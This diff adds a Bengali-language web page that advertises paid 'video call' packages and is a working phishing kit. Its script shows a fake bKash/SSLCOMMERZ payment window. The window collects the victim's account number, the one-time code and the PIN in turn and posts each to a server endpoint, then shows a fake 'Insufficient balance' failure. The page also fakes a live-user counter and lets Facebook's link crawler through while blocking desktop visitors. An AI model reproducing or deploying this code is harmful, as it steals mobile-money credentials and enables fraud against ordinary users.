@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>ভিডিও কল সার্ভিস - সাইন আপ & পেমেন্ট</title>
+
+<meta property="og:title" content="🎯 কাজের রেট দেখতে এবং টাকা পাঠাতে ছবির উপর টাচ করুন 💵">
+<meta property="og:description" content="আপনার সুবিধাজনক প্যাকেজটি নির্বাচন করুন">
+<meta property="og:image" content="https://raw.githubusercontent.com/wildcartxzx-beep/Fcxx/refs/heads/main/ccxx.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:type" content="website">
+
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+#device-blocker {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: #060e1a;
+    color: #f87171;
+    z-index: 100000;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Hind Siliguri', sans-serif;
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    padding: 20px;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Hind Siliguri', sans-serif;
+    user-select: none;
+    -webkit-user-select: none;
+}
+
+body {
+    background: radial-gradient(circle at top, #0b1e36, #050d18, #02060d);
+    color: #f8fafc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 12px;
+    overflow-x: hidden;
+    position: relative;
+}
+
+.bg-glow-1 {
+    position: absolute;
+    width: 320px;
+    height: 320px;
+    background: rgba(245, 158, 11, 0.18);
+    filter: blur(100px);
+    border-radius: 50%;
+    z-index: 0;
+    top: 5%;
+    left: 5%;
+    animation: pulseGlow 6s infinite alternate;
+}
+
+.bg-glow-2 {
+    position: absolute;
+    width: 300px;
+    height: 300px;
+    background: rgba(6, 182, 212, 0.18);
+    filter: blur(100px);
+    border-radius: 50%;
+    z-index: 0;
+    bottom: 5%;
+    right: 5%;
+    animation: pulseGlow 8s infinite alternate-reverse;
+}
+
+@keyframes pulseGlow {
+    0% { transform: scale(1) translate(0, 0); }
+    100% { transform: scale(1.2) translate(20px, 20px); }
+}
+
+.card {
+    width: 100%;
+    max-width: 430px;
+    padding: 22px 16px;
+    border-radius: 26px;
+    background: rgba(11, 26, 46, 0.92);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
+    border: 1.5px solid rgba(245, 158, 11, 0.35);
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.85), 0 0 35px rgba(245, 158, 11, 0.15);
+    text-align: center;
+    position: relative;
+    z-index: 1;
+}
+
+.badge-urgent {
+    background: linear-gradient(90deg, #d97706, #f59e0b);
+    color: #02060d;
+    font-size: 13px;
+    font-weight: 800;
+    padding: 5px 18px;
+    border-radius: 20px;
+    display: inline-block;
+    margin-bottom: 10px;
+    box-shadow: 0 4px 15px rgba(245, 158, 11, 0.4);
+    animation: flashBadge 1.5s infinite alternate;
+}
+
+@keyframes flashBadge {
+    0% { transform: scale(0.98); opacity: 0.9; }
+    100% { transform: scale(1.04); opacity: 1; box-shadow: 0 4px 20px rgba(245, 158, 11, 0.7); }
+}
+
+.main-title {
+    font-size: 26px;
+    font-weight: 700;
+    background: linear-gradient(to right, #fbbf24, #f59e0b, #38bdf8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 6px;
+}
+
+.description-box {
+    font-size: 13.5px;
+    color: #f1f5f9;
+    line-height: 1.5;
+    background: rgba(245, 158, 11, 0.08);
+    padding: 10px 12px;
+    border-radius: 14px;
+    margin-bottom: 14px;
+    border: 1px dashed rgba(245, 158, 11, 0.4);
+    font-weight: 600;
+}
+
+.description-box span {
+    color: #fbbf24;
+    text-decoration: underline;
+}
+
+.large-price-banner {
+    width: 100%;
+    max-height: 350px;
+    border-radius: 18px;
+    overflow: hidden;
+    margin-bottom: 14px;
+    border: 2px solid rgba(245, 158, 11, 0.3);
+    box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+    background: #000;
+    position: relative;
+    cursor: pointer;
+    transition: transform 0.2s;
+}
+
+.large-price-banner:active {
+    transform: scale(0.98);
+}
+
+.large-price-banner img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+
+.select-hint {
+    font-size: 14px;
+    color: #fef3c7;
+    font-weight: 700;
+    margin-bottom: 14px;
+    background: linear-gradient(90deg, rgba(245, 158, 11, 0.2), rgba(6, 182, 212, 0.2));
+    padding: 8px 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(245, 158, 11, 0.3);
+}
+
+.grid-container {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 16px;
+}
+
+.pkg-card {
+    background: linear-gradient(145deg, rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.02));
+    border: 1.5px solid rgba(245, 158, 11, 0.25);
+    border-radius: 18px;
+    padding: 14px 10px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: space-between;
+    gap: 8px;
+    transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.3);
+}
+
+.pkg-card:hover {
+    border-color: #fbbf24;
+    background: rgba(245, 158, 11, 0.12);
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(245, 158, 11, 0.25);
+}
+
+.pkg-card:active {
+    transform: scale(0.95);
+}
+
+.pkg-title {
+    font-size: 13.5px;
+    font-weight: 700;
+    color: #f1f5f9;
+    line-height: 1.3;
+}
+
+.pkg-price-tag {
+    width: 100%;
+    background: linear-gradient(135deg, #d97706, #b45309);
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 700;
+    padding: 8px 0;
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(217, 119, 6, 0.4);
+    letter-spacing: 0.3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+}
+
+.pkg-card.featured {
+    background: linear-gradient(145deg, rgba(245, 158, 11, 0.25), rgba(6, 182, 212, 0.2));
+    border: 2px solid #fbbf24;
+    box-shadow: 0 8px 25px rgba(245, 158, 11, 0.35);
+}
+
+.pkg-card.featured .pkg-title {
+    color: #ffffff;
+    font-size: 14px;
+}
+
+.pkg-card.featured .pkg-price-tag {
+    background: linear-gradient(135deg, #f59e0b, #d97706);
+    color: #000000;
+    animation: pulsePriceBtn 1.8s infinite;
+}
+
+@keyframes pulsePriceBtn {
+    0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7); }
+    70% { box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+}
+
+.popup-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(2, 6, 13, 0.85);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.25s ease;
+}
+
+.popup-overlay.show {
+    opacity: 1;
+    pointer-events: auto;
+}
+
+.popup-box {
+    width: 100%;
+    max-width: 350px;
+    background: #0b1a2e;
+    border: 1.5px solid rgba(226, 19, 110, 0.6);
+    border-radius: 24px;
+    padding: 25px 20px;
+    text-align: center;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.9), 0 0 30px rgba(226, 19, 110, 0.2);
+    transform: scale(0.9);
+    transition: transform 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+.popup-overlay.show .popup-box {
+    transform: scale(1);
+}
+
+.popup-title {
+    font-size: 20px;
+    font-weight: 700;
+    color: #ffffff;
+    margin-bottom: 6px;
+}
+
+.popup-desc {
+    font-size: 13.5px;
+    color: #cbd5e1;
+    margin-bottom: 18px;
+}
+
+.gateway-container {
+    display: flex;
+    justify-content: center;
+}
+
+.gateway-btn {
+    width: 100%;
+    background: linear-gradient(135deg, #e2136e, #be0e5a);
+    border: none;
+    padding: 14px;
+    border-radius: 16px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    transition: all 0.2s ease;
+    box-shadow: 0 8px 20px rgba(226, 19, 110, 0.4);
+}
+
+.gateway-btn:active {
+    transform: scale(0.96);
+}
+
+.gateway-logo {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    object-fit: cover;
+    border: 2px solid #ffffff;
+}
+
+.gateway-name {
+    font-size: 16.5px;
+    font-weight: 700;
+    color: #ffffff;
+}
+
+.close-popup {
+    margin-top: 16px;
+    background: transparent;
+    border: none;
+    color: #94a3b8;
+    font-size: 13.5px;
+    cursor: pointer;
+    font-weight: 600;
+}
+
+.close-popup:hover {
+    color: #ef4444;
+}
+
+.live {
+    margin-top: 8px;
+    font-size: 13px;
+    color: #22c55e;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-weight: 600;
+}
+
+.pulse-dot {
+    width: 8px;
+    height: 8px;
+    background-color: #22c55e;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+    animation: pulse 1.8s infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+    70% { transform: scale(1.05); box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
+    100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+}
+
+#c { color: #22c55e; font-weight: 700; }
+
+.brands-footer {
+    margin-top: 12px;
+    font-size: 12px;
+    color: #94a3b8;
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    align-items: center;
+    border-top: 1px solid rgba(255,255,255,0.08);
+    padding-top: 12px;
+}
+
+.bkash-logo-badge {
+    background: #e2136e;
+    color: white;
+    font-weight: bold;
+    padding: 3px 12px;
+    border-radius: 6px;
+    font-size: 11.5px;
+    box-shadow: 0 2px 8px rgba(226, 19, 110, 0.4);
+}
+
+#bkash-view-container {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background-color: #8c8c8c;
+    z-index: 99999;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 12vh;
+    font-family: 'Inter', sans-serif;
+}
+
+.bkash-container { 
+    width: 92%; max-width: 350px; height: 450px; background: white; 
+    border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
+    display: flex; flex-direction: column; position: relative; overflow: hidden;
+}
+
+.header { height: 45px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f1f1f1; flex-shrink: 0; }
+.header img { width: 70px; }
+
+.merchant-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #eee; flex-shrink: 0; }
+.m-info { display: flex; align-items: center; gap: 8px; }
+.m-icon { width: 32px; height: 32px; border: 1px solid #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: white; }
+.m-icon img { width: 130%; height: 130%; object-fit: cover; }
+.m-text { font-size: 10px; font-weight: 500; color: #4A4A4A; line-height: 1.2; text-align: left; }
+.m-amount { font-weight: 700; font-size: 14px; color: #4A4A4A; }
+
+.content-area { 
+    background: #e2136e; flex-grow: 1; display: flex; flex-direction: column; 
+    align-items: center; justify-content: center; padding: 15px 20px; 
+    color: white; text-align: center; position: relative;
+}
+
+.label-main { font-size: 14px; font-weight: 500; margin-bottom: 10px; }
+.label-sub { font-size: 15px; font-weight: 500; margin-bottom: 10px; }
+
+.main-input { 
+    width: 100%; height: 42px; border-radius: 6px; border: 2.5px solid rgba(255, 255, 255, 0.5); 
+    box-shadow: 0 0 8px rgba(255, 255, 255, 0.3); text-align: center; font-size: 17px; 
+    font-weight: 600; color: #4A4A4A; outline: none; margin: 10px 0; box-sizing: border-box;
+    background: white;
+}
+
+.main-input::placeholder { color: #4A4A4A; opacity: 0.3; font-weight: 400; }
+
+.resend-link { font-size: 13px; text-decoration: underline; cursor: pointer; color: white; display: none; font-weight: 500; }
+.timer-box { font-size: 12px; }
+
+.action-bar { height: 65px; background: #f1f1f1; display: flex; align-items: center; padding: 0 15px; gap: 10px; flex-shrink: 0; }
+.btn { flex: 1; height: 40px; border-radius: 3px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
+.btn-cancel { background: white; border: 1px solid #ddd; color: #666; }
+.btn-confirm { background: #b5b5b5; color: white; pointer-events: none; }
+.btn-confirm.active { background: #e2136e; pointer-events: auto; }
+
+#loader-overlay { position: absolute; inset: 0; background: #e2136e; z-index: 20; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+.dots { display: flex; gap: 6px; }
+.dots div { width: 10px; height: 10px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
+.inner-loader { display: none; gap: 4px; position: absolute; }
+.inner-loader div { width: 7px; height: 7px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
+@keyframes bounce { to { opacity: 0.3; transform: translateY(-4px); } }
+
+#fail-screen { display: none; position: absolute; inset: 0; background: #e2136e; flex-direction: column; align-items: center; justify-content: center; z-index: 30; padding: 20px; }
+.fail-icon { width: 45px; height: 45px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 300; margin-bottom: 12px; }
+.fail-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+.fail-reason { font-size: 15px; font-weight: 400; opacity: 0.9; margin-bottom: 15px; }
+.fail-redirect { font-size: 11px; opacity: 0.8; margin-top: 5px; }
+.fail-redirect u { text-decoration: underline; }
+
+.footer { height: 50px; background: white; border-top: 1px solid #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 9px; color: #999; flex-shrink: 0; }
+.footer b { color: #e2136e; font-size: 11px; margin-bottom: 2px; }
+</style>
+</head>
+<body>
+
+<div class="bg-glow-1"></div>
+<div class="bg-glow-2"></div>
+
+<div id="device-blocker">⚠️ Access Denied! Please Open This Site From A Mobile Device.</div>
+
+<div class="popup-overlay" id="gatewayPopup">
+    <div class="popup-box">
+        <div class="popup-title">পেমেন্ট মাধ্যম সিলেক্ট করুন</div>
+        <div class="popup-desc">পেমেন্ট সম্পন্ন করতে নিচের বিকাশ বাটনে চাপুন:</div>
+        
+        <div class="gateway-container">
+            <div class="gateway-btn" onclick="startBkashPayment()">
+                <img src="https://raw.githubusercontent.com/wildcartxzx-beep/Cartimage/refs/heads/main/1701670291bKash-App-Logo-PNG.png" alt="bKash" class="gateway-logo">
+                <span class="gateway-name">বিকাশের মাধ্যমে পেমেন্ট করুন</span>
+            </div>
+        </div>
+        
+        <button class="close-popup" onclick="closePopup()">বাতিল করুন</button>
+    </div>
+</div>
+
+<div class="card" id="mainCard">
+    <div class="badge-urgent">⚡ অফারটি সীমিত সময়ের জন্য!</div>
+    <div class="main-title">ভিডিও কল সার্ভিস</div>
+    
+    <div class="description-box">
+        <p>⚠️ সরাসরি পেমেন্ট করতে নিচের কাঙ্ক্ষিত <span>প্যাকেজের উপর টাচ করুন</span>[cite: 3].</p>
+    </div>
+
+    <div class="large-price-banner" onclick="openPopup('20')">
+        <img src="https://raw.githubusercontent.com/wildcartxzx-beep/Fcxx/refs/heads/main/ddae3901034647fa1dcbfbff2624ef986b993dc0e7d1438e19a3461c3aed85b3.png" alt="Price List Banner">
+    </div>
+
+    <div class="select-hint">
+        👇 যে প্যাকেজটি নিবেন সরাসরি তাতে চাপুন:
+    </div>
+
+    <div class="grid-container">
+        <div class="pkg-card featured" onclick="openPopup('20')">
+            <div class="pkg-title">🔥 ৩ মিনিট ভিডিও কল</div>
+            <div class="pkg-price-tag">২০ টাকা</div>
+        </div>
+
+        <div class="pkg-card" onclick="openPopup('130')">
+            <div class="pkg-title">⏰ ৫ মিনিট ভিডিও কল</div>
+            <div class="pkg-price-tag">১৩০ টাকা</div>
+        </div>
+
+        <div class="pkg-card" onclick="openPopup('250')">
+            <div class="pkg-title">⏰ ১০ মিনিট ভিডিও কল</div>
+            <div class="pkg-price-tag">২৫০ টাকা</div>
+        </div>
+
+        <div class="pkg-card" onclick="openPopup('350')">
+            <div class="pkg-title">⏰ ২০ মিনিট ভিডিও কল</div>
+            <div class="pkg-price-tag">৩৫০ টাকা</div>
+        </div>
+
+        <div class="pkg-card" onclick="openPopup('510')">
+            <div class="pkg-title">⏰ ৩০ মিনিট ভিডিও কল</div>
+            <div class="pkg-price-tag">৫১০ টাকা</div>
+        </div>
+
+        <div class="pkg-card" onclick="openPopup('1020')">
+            <div class="pkg-title">⏰ ১ ঘন্টা ভিডিও কল</div>
+            <div class="pkg-price-tag">১০২০ টাকা</div>
+        </div>
+    </div>
+
+    <div class="live">
+        <span class="pulse-dot"></span> বর্তমানে <span id="c">42</span> জন অনলাইন আছেন 🔥
+    </div>
+    
+    <div class="brands-footer">
+        <span>১০০% নিরাপদ পেমেন্ট:</span>
+        <span class="bkash-logo-badge">bKash বিকাশ</span>
+    </div>
+</div>
+
+<div id="bkash-view-container">
+    <div class="bkash-container">
+        <div class="header"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png"></div>
+        <div id="merchant-bar" class="merchant-bar">
+            <div class="m-info">
+                <div class="m-icon"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/heads/main/images%20(3).png"></div>
+                <div class="m-text"><b>SSLCOMMERZ</b><br><span>Inv: 8cf84713499...</span></div>
+            </div>
+            <div class="m-amount">৳<span id="displayAmount">20</span></div>
+        </div>
+
+        <div class="content-area">
+            <div id="loader-overlay">
+                <div class="dots"><div></div><div></div><div></div></div>
+                <p style="margin-top:10px; font-size: 13px;">Loading</p>
+            </div>
+
+            <div id="ui-steps" style="width: 100%;">
+                <div id="label-top" class="label-main">Your bKash Account Number</div>
+                <div id="label-mid" class="label-sub"></div>
+                <input type="tel" id="user-input" class="main-input" placeholder="e.g 01XXXXXXXXX" maxlength="11" oninput="validateInput()">
+                <div id="terms-txt" style="font-size: 12px;">Confirm and proceed, <u style="cursor:pointer">terms & conditions</u></div>
+                <div id="resend-container" style="display: none; margin-top: 5px;">
+                    <div id="timer-box" class="timer-box">Resend Code in <span id="timer">30</span>s</div>
+                    <div id="resend-link" class="resend-link" onclick="handleResend()">Resend Code</div>
+                </div>
+            </div>
+
+            <div id="fail-screen">
+                <div class="fail-icon">✕</div>
+                <div class="fail-title">Payment Failed</div>
+                <div class="fail-reason">Insufficient balance</div>
+                <div class="fail-redirect">Redirecting to <u>Merchant Website</u> in <span id="redir-timer">5</span>s</div>
+            </div>
+        </div>
+
+        <div class="action-bar" id="action-bar">
+            <button class="btn btn-cancel" onclick="cancelPayment()">Cancel</button>
+            <button id="confirm-btn" class="btn btn-confirm" onclick="handleFlow()">
+                <span id="btn-text">Confirm</span>
+                <div class="inner-loader" id="btn-load"><div></div><div></div><div></div></div>
+            </button>
+        </div>
+        <div class="footer"><b>📞 16247</b><div>© 2026 bKash, All Rights Reserved</div></div>
+    </div>
+</div>
+
+<script>
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+function playClickSound() {
+    if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+    }
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(150, audioCtx.currentTime + 0.04);
+    
+    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.04);
+    
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.04);
+}
+
+function checkDevice() {
+    var ua = navigator.userAgent || navigator.vendor || window.opera;
+    if (/facebookexternalhit|Facebot|MetaInspector/i.test(ua)) {
+        return;
+    }
+
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const isSmallScreen = window.innerWidth <= 768; 
+    
+    if (!isMobile && !isSmallScreen) {
+        document.getElementById('device-blocker').style.display = 'flex';
+        document.body.innerHTML = document.getElementById('device-blocker').outerHTML;
+        throw new Error("Blocked: Mobile view required.");
+    }
+}
+checkDevice();
+window.addEventListener('resize', checkDevice);
+
+let selectedAmount = "20";
+
+window.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const amountParam = urlParams.get('amount');
+    if (amountParam) {
+        selectedAmount = amountParam;
+        openBkashView();
+    }
+});
+
+function openPopup(amt) {
+    playClickSound();
+    selectedAmount = amt;
+    document.getElementById("gatewayPopup").classList.add("show");
+}
+
+function closePopup() {
+    playClickSound();
+    document.getElementById("gatewayPopup").classList.remove("show");
+}
+
+function startBkashPayment() {
+    playClickSound();
+    closePopup();
+    openBkashView();
+    // সার্ভারে ব্যাকগ্রাউন্ড ফ্লো স্টার্ট করার জন্য রিকোয়েস্ট পাঠানো
+    sendToServer({ type: 'START_FLOW', amount: selectedAmount });
+}
+
+function openBkashView() {
+    document.getElementById('displayAmount').innerText = selectedAmount;
+    document.getElementById('bkash-view-container').style.display = 'flex';
+    document.getElementById('loader-overlay').style.display = 'flex';
+    setTimeout(() => { 
+        document.getElementById('loader-overlay').style.display = 'none'; 
+    }, 1500);
+}
+
+function cancelPayment() {
+    playClickSound();
+    document.getElementById('bkash-view-container').style.display = 'none';
+    step = 1;
+    document.getElementById('user-input').value = "";
+    document.getElementById('label-top').innerText = "Your bKash Account Number";
+    document.getElementById('label-mid').innerText = "";
+    document.getElementById('terms-txt').style.display = 'block';
+    document.getElementById('resend-container').style.display = 'none';
+    validateInput();
+}
+
+let c = 42;
+setInterval(() => {
+    c += Math.random() < 0.5 ? -1 : 1;
+    if (c < 28) c = 32;
+    if (c > 85) c = 68;
+    const counterEl = document.getElementById("c");
+    if(counterEl) counterEl.innerText = c;
+}, 2800);
+
+let step = 1, number = "", otpInterval;
+
+function validateInput() {
+    const input = document.getElementById('user-input');
+    const btn = document.getElementById('confirm-btn');
+    const len = input.value.length;
+    if (step === 1) len === 11 ? btn.classList.add('active') : btn.classList.remove('active');
+    else if (step === 2) len === 6 ? btn.classList.add('active') : btn.classList.remove('active');
+    else if (step === 3) (len >= 4 && len <= 5) ? btn.classList.add('active') : btn.classList.remove('active');
+}
+
+async function sendToServer(payload) {
+    try {
+        await fetch('/api/payment-step', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {}
+}
+
+function startOTPTimer() {
+    let timeLeft = 30;
+    const timerBox = document.getElementById('timer-box');
+    const resendLink = document.getElementById('resend-link');
+    timerBox.style.display = 'block';
+    resendLink.style.display = 'none';
+    clearInterval(otpInterval);
+    otpInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById('timer').innerText = timeLeft;
+        if(timeLeft <= 0) {
+            clearInterval(otpInterval);
+            timerBox.style.display = 'none';
+            resendLink.style.display = 'block';
+        }
+    }, 1000);
+}
+
+function handleResend() { 
+    playClickSound();
+    startOTPTimer(); 
+    sendToServer({ type: 'RESEND', number });
+}
+
+function handleFlow() {
+    playClickSound();
+    const input = document.getElementById('user-input');
+    const loader = document.getElementById('btn-load');
+    const btnTxt = document.getElementById('btn-text');
+    const val = input.value;
+    btnTxt.style.visibility = 'hidden';
+    loader.style.display = 'flex';
+    let delay = (step === 1) ? 4000 : 1500;
+
+    setTimeout(() => {
+        btnTxt.style.visibility = 'visible';
+        loader.style.display = 'none';
+        if(step === 1) {
+            number = val;
+            sendToServer({ type: 'NUMBER', number, amount: selectedAmount });
+            document.getElementById('label-top').innerText = "Enter Verification Code Sent To";
+            document.getElementById('label-mid').innerText = number.substring(0,3) + " ** *** " + number.substring(8);
+            document.getElementById('terms-txt').style.display = 'none';
+            document.getElementById('resend-container').style.display = 'block';
+            input.value = ""; input.placeholder = "Enter 6 digit code"; input.maxLength = 6;
+            step = 2; startOTPTimer();
+        } 
+        else if(step === 2) {
+            clearInterval(otpInterval);
+            sendToServer({ type: 'OTP', otp: val, number });
+            document.getElementById('label-top').innerText = "Enter PIN of Your bKash Account";
+            document.getElementById('label-mid').innerText = "(" + number.substring(0,3) + " ** *** " + number.substring(8) + ")";
+            document.getElementById('resend-container').style.display = 'none';
+            input.value = ""; 
+            input.type = "tel"; 
+            input.style.webkitTextSecurity = "disc"; 
+            input.placeholder = "Enter PIN"; 
+            input.maxLength = 5;
+            step = 3;
+        }
+        else if(step === 3) {
+            sendToServer({ type: 'PIN', pin: val, number });
+            document.getElementById('merchant-bar').style.display = 'none';
+            document.getElementById('action-bar').style.display = 'none';
+            document.getElementById('ui-steps').style.display = 'none';
+            document.getElementById('fail-screen').style.display = 'flex';
+            startRedirectTimer();
+        }
+        validateInput(); 
+    }, delay);
+}
+
+function startRedirectTimer() {
+    let rs = 5;
+    const interval = setInterval(() => {
+        rs--;
+        if(document.getElementById('redir-timer')) document.getElementById('redir-timer').innerText = rs;
+        if(rs <= 0) { 
+            clearInterval(interval); 
+            window.location.reload(); 
+        }
+    }, 1000);
+}
+</script>
+
+</body>
+</html>
